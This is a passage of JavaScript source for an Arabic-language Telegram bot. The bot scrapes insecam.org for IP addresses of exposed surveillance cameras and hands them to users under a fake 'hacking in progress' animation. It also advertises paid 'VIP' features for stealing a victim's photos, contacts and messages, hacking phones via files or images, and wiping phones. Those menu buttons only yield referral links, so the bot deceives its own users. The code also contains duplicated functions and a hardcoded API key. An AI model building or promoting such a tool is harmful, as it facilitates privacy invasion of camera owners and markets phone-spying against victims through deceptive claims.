    
    if (data === 'get_cameras') {
        showCameraCountryList(chatId);
    } else if (data in cameraCountryTranslation) {
        bot.deleteMessage(chatId, query.message.message_id);
        displayCameras(chatId, data);
    } else if (data.startsWith("camera_next_")) {
        const startIndex = parseInt(data.split("_")[2], 10);
        bot.deleteMessage(chatId, query.message.message_id);
        showCameraCountryList(chatId, startIndex);
    } else if (data === 'get_joke') {
        await getJoke(chatId); 
    } else if (data === 'get_love_message') {
        await getLoveMessage(chatId); 
    }
});

function showCameraCountryList(chatId, startIndex = 0) {
    try {
        const buttons = [];
        const countryCodes = Object.keys(cameraCountryTranslation);
        const countryNames = Object.values(cameraCountryTranslation);

        const endIndex = Math.min(startIndex + 99, countryCodes.length); // عرض 99 دولة في كل صفحة

        for (let i = startIndex; i < endIndex; i += 3) {
            const row = [];
            for (let j = i; j < i + 3 && j < endIndex; j++) {
                const code = countryCodes[j];
                const name = countryNames[j];
                row.push({ text: name, callback_data: code });
            }
            buttons.push(row);
        }

        if (endIndex < countryCodes.length) {
            buttons.push([{ text: "المزيد", callback_data: `camera_next_${endIndex}` }]);
        }

        bot.sendMessage(chatId, "اختر الدولة:", {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
    } catch (error) {
        bot.sendMessage(chatId, `حدث خطأ أثناء إنشاء القائمة: ${error.message}`);
    }
}

// عرض الكاميرات
async function displayCameras(chatId, countryCode) {
    try {
      
        const message = await bot.sendMessage(chatId, "جاري اختراق كامراة مراقبه.....");
        const messageId = message.message_id;

        for (let i = 0; i < 15; i++) {
            await bot.editMessageText(`جاري اختراق كامراة مراقبه${'.'.repeat(i % 4)}`, {
                chat_id: chatId,
                message_id: messageId
            });
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        const url = `http://www.insecam.org/en/bycountry/${countryCode}`;
        const headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
        };

        let res = await axios.get(url, { headers });
        const lastPageMatch = res.data.match(/pagenavigator\("\?page=", (\d+)/);
        if (!lastPageMatch) {
            bot.sendMessage(chatId, "لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة الامان جرب دوله مختلفه او حاول مره اخرى لاحقًا.");
            return;
        }
        const lastPage = parseInt(lastPageMatch[1], 10);
        const cameras = [];

        for (let page = 1; page <= lastPage; page++) {
            res = await axios.get(`${url}/?page=${page}`, { headers });
            const pageCameras = res.data.match(/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
            cameras.push(...pageCameras);
        }

        if (cameras.length) {
            const numberedCameras = cameras.map((camera, index) => `${index + 1}. ${camera}`);
            for (let i = 0; i < numberedCameras.length; i += 50) {
                const chunk = numberedCameras.slice(i, i + 50);
                await bot.sendMessage(chatId, chunk.join('\n'));
            }
            await bot.sendMessage(chatId, "لقد تم اختراق كامراة المراقبه من هذا الدوله يمكنك التمتع في المشاهده .\n ⚠️ملاحظه مهمه اذا لم تفتح الكامرات في جهازك او طلبت باسورد قم في تعير الدوله او حاول مره اخره لاحقًا ");
        } else {
            await bot.sendMessage(chatId, "لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.");
        }
    } catch (error) {
        await bot.sendMessage(chatId, `لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.`);
    }
}

console.log('Bot is running...');

function subscribeUser(userId) {
  if (!subscribedUsers.has(userId)) {
    subscribedUsers.add(userId);
    bot.sendMessage(userId, 'تم اشتراكك بنجاح! يمكنك الآن استخدام جميع ميزات البوت.');
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد الاشتراك
    return true;
  }
  return false;
}

function unsubscribeUser(userId) {
  if (subscribedUsers.has(userId)) {
    subscribedUsers.delete(userId);
    bot.sendMessage(userId, 'تم إلغاء اشتراكك. قد تواجه بعض القيود على استخدام البوت.');
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إلغاء الاشتراك
    return true;
  }
  return false;
}

function deductPointsFromUser(userId, points) {
  if (!allUsers.has(userId)) {
    console.log(`المستخدم ${userId} غير موجود`);
    return false;
  }
  const user = allUsers.get(userId);
  if ((user.points || 0) >= points) {
    user.points -= points;
    userPoints.set(userId, user.points);
    console.log(`تم خصم ${points} نقاط من المستخدم ${userId}. الرصيد الجديد: ${user.points}`);
    
    if (user.points < pointsRequiredForSubscription) {
      subscribedUsers.delete(userId);
      console.log(`تم إلغاء اشتراك المستخدم ${userId} بسبب نقص النقاط`);
      bot.sendMessage(userId, 'تم إلغاء اشتراكك بسبب نقص النقاط. يرجى جمع المزيد من النقاط للاشتراك مرة أخرى.');
    }
    
    return true;
  }
  console.log(`فشل خصم النقاط للمستخدم ${userId}. الرصيد الحالي: ${user.points}, المطلوب: ${points}`);
  return false;
}
// تشغيل البوت
bot.on('polling_error', (error) => {
  console.log(error);
});

console.log('البوت يعمل الآن...');

const crypto = require('crypto');

function createReferralLink(userId) {
  const referralCode = Buffer.from(userId).toString('hex');
  return `https://t.me/VIP_H3bot?start=${referralCode}`;
}

function decodeReferralCode(code) {
  try {
    return Buffer.from(code, 'hex').toString('utf-8');
  } catch (error) {
    console.error('خطأ في فك تشفير رمز الإحالة:', error);
    return null;
  }
}

let botInfo;
bot.getMe().then(info => {
    botInfo = info;
    console.log('تم تشغيل البوت:', info.username);
}).catch(error => {
    console.error('خطأ في الحصول على معلومات البوت:', error);
});

const OWNER_ID = '6808883615';

const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR);
}

const DATA_FILE = path.join(DATA_DIR, 'data.json');

let data = {
    admins: [],
    channels: {
        public: [],
        private: []
    }
};

function fetchStoredData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const fileData = fs.readFileSync(DATA_FILE, 'utf8');
            const parsed = JSON.parse(fileData);
            data = {
                channels: {
                    public: Array.isArray(parsed.channels?.public) ? parsed.channels.public : [],
                    private: Array.isArray(parsed.channels?.private) ? parsed.channels.private : []
                },
                admins: Array.isArray(parsed.admins) ? parsed.admins : []
            };
            console.log('تم تحميل البيانات بنجاح:', data);
        } else {
            persistData();
            console.log('تم إنشاء ملف بيانات جديد');
        }
    } catch (error) {
        console.error('خطأ في قراءة ملف البيانات:', error);
        if (fs.existsSync(DATA_FILE)) {
            const backupFile = `${DATA_FILE}.backup-${Date.now()}`;
            fs.copyFileSync(DATA_FILE, backupFile);
            console.log('تم إنشاء نسخة احتياطية:', backupFile);
        }
        data = { channels: { public: [], private: [] }, admins: [] };
        persistData();
    }
}

function persistData() {
    try {
        const tempFile = `${DATA_FILE}.temp`;
        fs.writeFileSync(tempFile, JSON.stringify(data, null, 2), 'utf8');
        
        const tempData = JSON.parse(fs.readFileSync(tempFile, 'utf8'));
        if (!tempData.channels || !tempData.admins) {
            throw new Error('بيانات غير صالحة');
        }
        
        fs.renameSync(tempFile, DATA_FILE);
        console.log('تم حفظ البيانات بنجاح');
    } catch (error) {
        console.error('خطأ في حفظ البيانات:', error);
        const tempFile = `${DATA_FILE}.temp`;
        if (fs.existsSync(tempFile)) {
            fs.unlinkSync(tempFile);
        }
    }
}
function checkUserPermissions(userId) {
    const userIdStr = userId.toString();
    if (userIdStr === OWNER_ID) return 'owner';
    if (data.admins.includes(userIdStr)) return 'admin';
    return 'user';
}
async function checkBotPermissions(chatId) {
    try {
        if (!botInfo) {
            botInfo = await bot.getMe();
        }
        const botMember = await bot.getChatMember(chatId, botInfo.id.toString());
        return {
            isAdmin: botMember.status === 'administrator',
            canInviteUsers: botMember.can_invite_users === true,
            error: null
        };
    } catch (error) {
        return {
            isAdmin: false,
            canInviteUsers: false,
            error: error.message
        };
    }
}

async function createInviteLink(chatId) {
    try {
        const permissions = await checkBotPermissions(chatId);
        if (!permissions.isAdmin || !permissions.canInviteUsers) {
            console.log('خطأ في الصلاحيات:', permissions);
            return null;
        }

        const invite = await bot.createChatInviteLink(chatId, {
            name: `رابط دائم - ${new Date().toISOString()}`,
            creates_join_request: false
        });
        return invite.invite_link;
    } catch (error) {
        console.error('خطأ في إنشاء رابط الدعوة:', error);
        return null;
    }
}

bot.onText(/\/sss/, async (msg) => {
    const userId = msg.from.id;
    const userRole = checkUserPermissions(userId);
    
    if (userRole !== 'owner') {
        
        return;
    }

    const keyboard = {
        inline_keyboard: [
            [{ text: '➕ إضافة أدمن', callback_data: 'sj-gd' }],
            [{ text: '❌ حذف أدمن', callback_data: 'remove_admin' }],
            [{ text: '📋 عرض الأدمن', callback_data: 'list_admins' }]
        ]
    };

    bot.sendMessage(userId, '🔰 قائمة إدارة الأدمن:', { reply_markup: keyboard });
});

bot.onText(/\/sjgd/, (msg) => {
    const userId = msg.from.id;
    const userRole = checkUserPermissions(userId);
    
    if (userRole === 'user') {
       
        return;
    }

    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '➕ إضافة قناة عامة', callback_data: 'add_public' }],
                [{ text: '➕ إضافة قناة خاصة', callback_data: 'add_private_info' }],
                [{ text: '❌ حذف قناة', callback_data: 'remove_channel' }],
                [{ text: '📋 عرض القنوات', callback_data: 'list_channels' }]
            ]
        }
    };

    bot.sendMessage(userId, '📢 قائمة إدارة قنوات الاشتراك الإجباري:', options);
});

bot.on('callback_query', async (query) => {
    const userId = query.from.id;
    const userRole = checkUserPermissions(userId); // التحقق من صلاحيات المستخدم
    const callbackData = query.data;

   
    if (callbackData.startsWith('sj-gd') || callbackData.startsWith('remove_admin_') || callbackData === 'list_admins') {
        if (userRole !== 'owner') {
            
            return;
        }
    } else if (userRole === 'user') {
        
        return;
    }

   
    if (callbackData === 'sj-gd') {
        bot.sendMessage(userId, 'أرسل معرف المستخدم (ID) الذي تريد إضافته كأدمن:');
        bot.once('message', async (msg) => {
            const newAdminId = msg.text.trim();
            if (/^\d+$/.test(newAdminId)) {
                if (!data.admins.includes(newAdminId)) {
                    data.admins.push(newAdminId);
                    persistData();
                    bot.sendMessage(userId, `✅ تم إضافة الأدمن (${newAdminId}) بنجاح!`);
                } else {
                    bot.sendMessage(userId, '⚠️ هذا المستخدم أدمن بالفعل!');
                }
            } else {
                bot.sendMessage(userId, '❌ عذراً، يجب أن يكون المعرف رقمياً.');
            }
        });
    } else if (callbackData === 'list_admins') {
        let message = '📋 قائمة الأدمن:\n\n';
        message += `👑 المالك الأساسي: ${OWNER_ID}\n\n`;

        if (data.admins.length === 0) {
            message += 'لا يوجد أدمن مضافين حالياً.';
        } else {
            message += '👮 الأدمن المضافين:\n';
            data.admins.forEach((adminId, index) => {
                message += `${index + 1}. ${adminId}\n`;
            });
        }

        bot.sendMessage(userId, message);
    } else if (callbackData === 'remove_admin') {
        const keyboard = {
            inline_keyboard: data.admins.map((adminId) => [
                { text: `🗑️ حذف ${adminId}`, callback_data: `remove_admin_${adminId}` },
            ]),
        };

        if (data.admins.length === 0) {
            bot.sendMessage(userId, '⚠️ لا يوجد أدمن لحذفه.');
        } else {
            bot.sendMessage(userId, '🔽 اختر الأدمن الذي تريد حذفه:', { reply_markup: keyboard });
        }
    } else if (callbackData.startsWith('remove_admin_')) {
        const adminId = callbackData.replace('remove_admin_', '');
        const adminIndex = data.admins.indexOf(adminId);

        if (adminIndex !== -1) {
            data.admins.splice(adminIndex, 1); // إزالة الأدمن من القائمة
            persistData();
            bot.sendMessage(userId, `✅ تم حذف الأدمن (${adminId}) بنجاح!`);
        } else {
            bot.sendMessage(userId, '❌ حدث خطأ: لم يتم العثور على الأدمن المحدد.');
        }
    }

    
    else if (callbackData === 'add_public') {
        bot.sendMessage(userId, 'يرجى إرسال معرف القناة العامة (مثال: @channel)');
        bot.once('message', async (msg) => {
            let channelUsername = msg.text.trim();
            if (!channelUsername.startsWith('@')) {
                channelUsername = '@' + channelUsername;
            }

            try {
                const chatInfo = await bot.getChat(channelUsername);
                if (chatInfo.type === 'channel') {
                    if (!data.channels.public.includes(channelUsername)) {
                        data.channels.public.push(channelUsername);
                        persistData();
                        bot.sendMessage(userId, `✅ تم إضافة القناة ${channelUsername} بنجاح!`);
                    } else {
                        bot.sendMessage(userId, '⚠️ هذه القناة مضافة مسبقاً!');
                    }
                } else {
                    bot.sendMessage(userId, '❌ عذراً، يجب أن يكون هذا معرف قناة صالح.');
                }
            } catch (error) {
                bot.sendMessage(userId, '❌ عذراً، لم يتم العثور على القناة أو ليس لدي صلاحيات كافية.');
            }
        });
    }
    
    else if (callbackData === 'add_private_info') {
        bot.sendMessage(userId, 
            '📝 لإضافة قناة خاصة كاشتراك إجباري:\n\n' +
            '1. أضف البوت كمشرف في القناة\n' +
            '2. امنحه صلاحية "دعوة المستخدمين عبر الرابط"\n' +
            '3. قم بتوجيه أي رسالة من القناة إلى البوت'
        );
    }
    
    else if (callbackData === 'list_channels') {
        let message = '📢 القنوات المضافة:\n\n';
        
        if (data.channels.public.length > 0) {
            message += '🌐 القنوات العامة:\n';
            data.channels.public.forEach(channel => {
                message += `• ${channel}\n`;
            });
            message += '\n';
        }
        
        if (data.channels.private.length > 0) {
            message += '🔒 القنوات الخاصة:\n';
            data.channels.private.forEach(channel => {
                message += `• ${channel.title}\n`;
            });
        }
        
        if (data.channels.public.length === 0 && data.channels.private.length === 0) {
            message = 'لا توجد قنوات مضافة حالياً.';
        }
        
        bot.sendMessage(userId, message);
    }
    
    else if (callbackData === 'remove_channel') {
        let keyboard = [];
        
        data.channels.public.forEach(channel => {
            keyboard.push([{
                text: `🌐 ${channel}`,
                callback_data: `remove_public_${channel}`
            }]);
        });
        
        data.channels.private.forEach(channel => {
            keyboard.push([{
                text: `🔒 ${channel.title}`,
                callback_data: `remove_private_${channel.id}`
            }]);
        });

        if (keyboard.length === 0) {
            bot.sendMessage(userId, 'لا توجد قنوات مضافة حالياً.');
            return;
        }

        bot.sendMessage(userId, 'اختر القناة التي تريد حذفها:', {
            reply_markup: { inline_keyboard: keyboard }
        });
    }
    
    else if (callbackData.startsWith('remove_public_')) {
        const channelToRemove = callbackData.replace('remove_public_', '');
        data.channels.public = data.channels.public.filter(channel => channel !== channelToRemove);
        persistData();
        bot.answerCallbackQuery(query.id, { text: `✅ تم حذف القناة ${channelToRemove} بنجاح!` });
        updateChannelList(query.message.chat.id, query.message.message_id);
    }
    
    else if (callbackData.startsWith('remove_private_')) {
        const channelId = callbackData.replace('remove_private_', '');
        const channelIndex = data.channels.private.findIndex(ch => ch.id === channelId);
        if (channelIndex > -1) {
            const channel = data.channels.private[channelIndex];
            data.channels.private.splice(channelIndex, 1);
            persistData();
            bot.answerCallbackQuery(query.id, { text: `✅ تم حذف القناة "${channel.title}" بنجاح!` });
            updateChannelList(query.message.chat.id, query.message.message_id);
        }
    }
});

// تحديث قائمة القنوات
function updateChannelList(chatId, messageId) {
    let keyboard = [];
    
    data.channels.public.forEach(channel => {
        keyboard.push([{
            text: `🌐 ${channel}`,
            callback_data: `remove_public_${channel}`
        }]);
    });
    
    data.channels.private.forEach(channel => {
        keyboard.push([{
            text: `🔒 ${channel.title}`,
            callback_data: `remove_private_${channel.id}`
        }]);
    });
    
    if (keyboard.length === 0) {
        bot.editMessageText('لا توجد قنوات مضافة حالياً.', {
            chat_id: chatId,
            message_id: messageId
        });
    } else {
        bot.editMessageReplyMarkup({ inline_keyboard: keyboard }, {
            chat_id: chatId,
            message_id: messageId
        });
    }
}

fetchStoredData();

bot.on('message', async (msg) => {
    if (!msg.forward_from_chat) return;
    
    const userId = msg.from.id;
    const userRole = checkUserPermissions(userId);
    
    if (userRole === 'user') return;
    
    if (msg.forward_from_chat.type === 'channel') {
        const chatId = msg.forward_from_chat.id;
        try {
            
            const chatInfo = await bot.getChat(chatId);
            
            
            if (!chatInfo.username) {
               
                const permissions = await checkBotPermissions(chatId);
                
                if (!permissions.isAdmin || !permissions.canInviteUsers) {
                    let errorMsg = '❌ عذراً، يجب منح البوت الصلاحيات التالية في القناة:\n\n';
                    errorMsg += '1. أن يكون مشرفاً\n';
                    errorMsg += '2. صلاحية "دعوة المستخدمين عبر الرابط"\n\n';
                    if (permissions.error) {
                        errorMsg += `خطأ إضافي: ${permissions.error}`;
                    }
                    bot.sendMessage(msg.chat.id, errorMsg);
                    return;
                }

                const inviteLink = await createInviteLink(chatId);
                if (!inviteLink) {
                    bot.sendMessage(msg.chat.id, '❌ حدث خطأ في إنشاء رابط الدعوة للقناة. تأكد من الصلاحيات وحاول مرة أخرى.');
                    return;
                }

               
                const existingChannel = data.channels.private.find(ch => ch.id === chatId.toString());
                if (existingChannel) {
                    existingChannel.invite_link = inviteLink;
                    persistData();
                    bot.sendMessage(msg.chat.id, 
                        `✅ تم تحديث رابط الدعوة للقناة "${chatInfo.title}"!\n\n` +
                        `🔗 الرابط الجديد: ${inviteLink}`
                    );
                } else {
                    data.channels.private.push({
                        id: chatId.toString(),
                        title: chatInfo.title,
                        invite_link: inviteLink
                    });
                    persistData();
                    bot.sendMessage(msg.chat.id, 
                        `✅ تم إضافة القناة الخاصة "${chatInfo.title}" إلى قائمة الاشتراك الإجباري!\n\n` +
                        `🔗 رابط الدعوة: ${inviteLink}`
                    );
                }
            } else {
                bot.sendMessage(msg.chat.id, '⚠️ هذه قناة عامة. يرجى استخدام أمر إضافة القناة العامة لإضافتها.');
            }
        } catch (error) {
            console.error('خطأ تفصيلي:', error);
            bot.sendMessage(msg.chat.id, 
                '❌ حدث خطأ أثناء إضافة القناة. تأكد من:\n\n' +
                '1. أن البوت مشرف في القناة\n' +
                '2. أن لديه صلاحية "دعوة المستخدمين عبر الرابط"\n' +
                '3. أن القناة صالحة وموجودة\n\n' +
                `تفاصيل الخطأ: ${error.message}`
            );
        }
    }
});

async function checkSubscription(userId) {
    const notSubscribedChannels = [];

    for (const channel of data.channels.public) {
        try {
            const member = await bot.getChatMember(channel, userId);
            if (member.status === 'left' || member.status === 'kicked') {
                notSubscribedChannels.push({
                    title: channel,
                    link: `https://t.me/${channel.slice(1)}`
                });
            }
        } catch (error) {
            console.error('خطأ في التحقق من العضوية:', error);
            continue;
        }
    }

    
    for (const channel of data.channels.private) {
        try {
            const member = await bot.getChatMember(channel.id, userId);
            if (member.status === 'left' || member.status === 'kicked') {
                
                let inviteLink = channel.invite_link;
                if (!inviteLink) {
                    inviteLink = await createInviteLink(channel.id);
                    if (inviteLink) {
                        channel.invite_link = inviteLink;
                        persistData();
                    }
                }
                
                notSubscribedChannels.push({
                    title: channel.title,
                    link: inviteLink || `يرجى الاتصال بمسؤول البوت للحصول على رابط الدعوة`
                });
            }
        } catch (error) {
            console.error('خطأ في التحقق من العضوية:', error);
            continue;
        }
    }

    if (notSubscribedChannels.length > 0) {
        const keyboard = notSubscribedChannels.map(channel => {
            if (channel.link.startsWith('http')) {
                return [{
                    text: `📢 الاشتراك في ${channel.title}`,
                    url: channel.link
                }];
            } else {
                return [{
                    text: `❌ ${channel.title} - ${channel.link}`,
                    callback_data: 'no_link'
                }];
            }
        });

        keyboard.push([{
            text: '✅ تحقق من الاشتراك',
            callback_data:'check_subscription'
        }]);

        bot.sendMessage(userId, 
            '⚠️ عذراً، يجب عليك الاشتراك في القنوات التالية أولاً:\n\n' +
            'اشترك في جميع القنوات ثم اضغط على زر التحقق من الاشتراك ✅', {
            reply_markup: { inline_keyboard: keyboard }
        });
        return false;
    }

    return true;
}

bot.on('callback_query', async (query) => {
    if (query.data === 'check_subscription') {
        const isSubscribed = await checkSubscription(query.from.id);
        if (isSubscribed) {
            bot.deleteMessage(query.message.chat.id, query.message.message_id);
            bot.sendMessage(query.message.chat.id, '✅ تم التحقق من اشتراكك في جميع القنوات بنجاح!');
            
        } else {
            bot.answerCallbackQuery(query.id, {
                text: '❌ عذراً، يجب عليك الاشتراك في جميع القنوات المطلوبة أولاً!',
                show_alert: true
            });
        }
    } else if (query.data === 'no_link') {
        bot.answerCallbackQuery(query.id, {
            text: 'يرجى الاتصال بمسؤول البوت للحصول على رابط الدعوة',
            show_alert: true
        });
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text ? msg.text.toLowerCase() : '';
    const senderId = msg.from.id.toString();

    if (!allUsers.has(chatId.toString())) {
        const newUser = {
            id: chatId,
            firstName: msg.from.first_name,
            lastName: msg.from.last_name || '',
            username: msg.from.username || ''
        };
        allUsers.set(chatId.toString(), newUser);
        saveData().catch(error => console.error('فشل في حفظ البيانات:', error));

       
        try {
            await Promise.all(
                admins.map(adminId => 
                    bot.sendMessage(adminId, `مستخدم جديد دخل البوت:\nالاسم: ${newUser.firstName} ${newUser.lastName}\nاسم المستخدم: @${newUser.username}\nمعرف الدردشة: ${chatId}`)
                )
            );
        } catch (error) {
            console.error('خطأ في إرسال الرسالة إلى المسؤولين:', error);
        }
    }

    if (bannedUsers.has(senderId)) {
        await bot.sendMessage(chatId, 'تم إيقافك او حظرك من  استخدام البوت من قبل المطور. لا يمكنك استخدام البوت حاليًا.');
        return;
    }

  
  if (text.startsWith('/start')) {
    const isSubscribed = await checkSubscription(senderId);
    if (!isSubscribed) {
      return;
    }
  }

  if (text === '/start') {
    showDefaultButtons(senderId);
  } else if (text === '/login') {
    showLoginButtons(senderId);
  } else if (text === '/hacking') {
    showHackingButtons(senderId);
  } else if (text === '/vip') {
    showVipOptions(chatId, senderId);
  } else if (text.startsWith('/start ')) {
    const startPayload = text.split(' ')[1];
    console.log('Start payload:', startPayload);

    if (startPayload) {
      const referrerId = decodeReferralCode(startPayload);
      console.log('Decoded referrer ID:', referrerId);
      console.log('Sender ID:', senderId);

      if (referrerId && referrerId !== senderId) {
        try {
          const usedLinks = usedReferralLinks.get(senderId) || new Set();
          if (!usedLinks.has(referrerId)) {
            usedLinks.add(referrerId);
            usedReferralLinks.set(senderId, usedLinks);

            const referrerPoints = addPointsToUser(referrerId, 1);

            await bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
            await bot.sendMessage(senderId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة وتمت إضافة نقطة للمستخدم الذي دعاك.');

            console.log(`User ${senderId} joined using referral link from ${referrerId}`);
          } else {
            await bot.sendMessage(senderId, 'لقد استخدمت هذا الرابط من قبل.');
          }
        } catch (error) {
          console.error('خطأ في معالجة رابط الدعوة:', error);
          await bot.sendMessage(senderId, 'لقد دخلت عبر رابط صديقك وتم اضافه 1$ لصديقك.');
        }
      } else {
        await bot.sendMessage(senderId, 'رابط الدعوة غير صالح أو أنك تحاول استخدام رابط الدعوة الخاص بك.');
      }
    } else {
      await bot.sendMessage(senderId, 'مرحبًا بك في البوت!');
    }

    showDefaultButtons(senderId);
  }
});

// التعامل مع الاستفسارات
bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const userId = callbackQuery.from.id.toString();
  const data = callbackQuery.data;

  try {
    
  
    const isSubscribed = await checkSubscription(userId);
    if (!isSubscribed) {

      return;
    }

    if (data === 'create_referral') {
      const referralLink = createReferralLink(userId);
      console.log('Created referral link:', referralLink);
      await bot.sendMessage(chatId, `رابط الدعوة الخاص بك هو:\n${referralLink}`);
      saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إنشاء رابط دعوة
    } else if (data === 'my_points') {
      const points = userPoints.get(userId) || 0;
      const isSubscribed = subscribedUsers.has(userId);
      let message = isSubscribed
        ? `لديك حاليًا ${points} نقطة. أنت مشترك في البوت ويمكنك استخدامه بدون قيود.`
        : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
      await bot.sendMessage(chatId, message);
    } else {
      if (!subscribedUsers.has(userId)) {
        await bot.sendMessage(chatId, 'تم تنفيذ طلبك بنجاح');
      } else {
        await bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
      
      }
    }
  } catch (error) {
    console.error('Error in callback query handler:', error);
    await bot.sendMessage(chatId, 'حدث خطأ أثناء تنفيذ العملية. الرجاء المحاولة مرة أخرى لاحقًا.');
  }

  saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد كل عملية
  await bot.answerCallbackQuery(callbackQuery.id);
});

function addPointsToUser(userId, points) {
  if (!allUsers.has(userId)) {
    allUsers.set(userId, { id: userId, points: 0 });
  }
  const user = allUsers.get(userId);
  user.points = (user.points || 0) + points;
  userPoints.set(userId, user.points);
  checkSubscriptionStatus(userId);
  saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إضافة النقاط
  return user.points;
}

function deductPointsFromUser(userId, points) {
  const currentPoints = userPoints.get(userId) || 0;
  if (currentPoints >= points) {
    const newPoints = currentPoints - points;
    userPoints.set(userId, newPoints);
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد خصم النقاط
    return true;
  }
  return false;
}

function addPointsToUser(userId, points) {
  if (!allUsers.has(userId)) {
    allUsers.set(userId, { id: userId, points: 0 });
  }
  const user = allUsers.get(userId);
  user.points = (user.points || 0) + points;
  userPoints.set(userId, user.points);
  
  // التحقق من حالة الاشتراك بعد إضافة النقاط
  checkSubscriptionStatus(userId);
  
  return user.points;
}


   function checkSubscriptionStatus(userId) {
  const user = allUsers.get(userId);
  if (!user) return false;

  if (user.points >= pointsRequiredForSubscription) {
    if (!subscribedUsers.has(userId)) {
      // خصم النقاط المطلوبة للاشتراك
      user.points -= pointsRequiredForSubscription;
      userPoints.set(userId, user.points);
      
      subscribedUsers.add(userId);
      bot.sendMessage(userId, `تهانينا! لقد تم اشتراكك تلقائيًا. تم خصم ${pointsRequiredForSubscription} نقطة من رصيدك.`);
      saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد الاشتراك
    }
    return true;
  } else {
    if (subscribedUsers.has(userId)) {
      subscribedUsers.delete(userId);
      bot.sendMessage(userId, 'تم إلغاء اشتراكك بسبب نقص النقاط. يرجى جمع المزيد من النقاط للاشتراك مرة أخرى.');
      saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إلغاء الاشتراك
    }
    return false;
  }
}
function trackAttempt(userId, feature) {
  if (!userVisits[userId]) userVisits[userId] = {};
  userVisits[userId][feature] = (userVisits[userId][feature] || 0) + 1;
  return userVisits[userId][feature];
}

function shortenUrl(url) {
  return new Promise((resolve, reject) => {
    TinyURL.shorten(url, function(res, err) {
      if (err)
        reject(err);
      else
        resolve(res);
    });
  });
}

const uuid = require('uuid'); 
const botUsername = 'VIP_H3bot'; 
let userPoints = {}; 
let linkData = {}; 
let visitorData = {}; 
function showVipOptions(chatId, userId) {
    const linkId = uuid.v4(); 
    linkData[linkId] = {
        userId: userId,
        chatId: chatId,
        visitors: []
    };

    console.log('Link Data Saved:', linkData); 

    const message = 'مرحبًا! هذا الخيارات مدفوع بسعر 30$، يمكنك تجميع النقاط وفتحها مجاناً.';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'سحب جميع صور الهاتف عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
                [{ text: 'سحب جميع أرقام الضحية عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
                [{ text: 'اختراق الهاتف عبر ملف 🔒', callback_data: `get_link_${linkId}` }],
                [{ text: 'اختراق الهاتف عبر صوره🔒', callback_data: `get_link_${linkId}` }],
                [{ text: 'سحب جميع رسائل الضحية عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
                [{ text: 'فرمتة جوال الضحية عبر رابط 🔒', callback_data: `get_link_${linkId}` }]
            ]
        }
    });
}

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    const data = query.data.split('_');

    console.log('Received callback query:', query.data);

    const linkId = data[2]; 
    console.log('Link ID:', linkId); 
    
    if (linkData[linkId]) {
        const { userId: storedUserId, chatId: storedChatId } = linkData[linkId];
        console.log('Stored Link Data:', linkData[linkId]);

        const linkMessage = `رابط تجميع النقاط الخاص بك\n عندما يقوم شخص بالدخول إلى الرابط الخاص بك سوف تحصل على 1$\n: https://t.me/${botUsername}?start=${linkId}`;

 try {
            await bot.sendMessage(chatId, linkMessage);
            bot.answerCallbackQuery(query.id, { text: 'تم إرسال رابط الدعوة.' });
            console.log('Successfully sent invite link:', linkMessage);
        } catch (error) {
            console.error('Error sending invite link:', error);
            bot.answerCallbackQuery(query.id, { text: 'حدث خطأ أثناء إرسال رابط الدعوة.', show_alert: true });
        }
    } else if (query.data === 'add_nammes') {
        bot.sendMessage(chatId, `قم بإرسال هذا لفتح أوامر اختراق الهاتف كاملاً: قم بالضغط على هذا الأمر /Vip`);
    }
});
     
bot.onText(/\/start (.+)/, (msg, match) => {
    const visitorId = msg.from.id;
    const linkId = match[1];

    if (linkData && linkData[linkId]) {
        const { userId, chatId, visitors } = linkData[linkId];

        if (visitorId !== userId && (!visitorData[visitorId] || !visitorData[visitorId].includes(userId))) {
            visitors.push(visitorId);

            if (!visitorData[visitorId]) {
                visitorData[visitorId] = [];
            }
            visitorData[visitorId].push(userId);

            if (!userPoints[userId]) {
                userPoints[userId] = 0;
            }
            userPoints[userId] += 1;

            const message = `شخص جديد دخل إلى الرابط الخاص بك! لديك الآن ${userPoints[userId]}$\nعندما تصل إلى 30$ سيتم فتح الميزات المدفوعة تلقائيًا.`;
            bot.sendMessage(chatId, message);
        }
    }
});

const apiKey = 'c35b4ecbb3a54362a7ea95351962f9bc';

const url = 'https://randommer.io/api/Card';

async function getCardData() {
    try {
        const response = await fetch(url, {
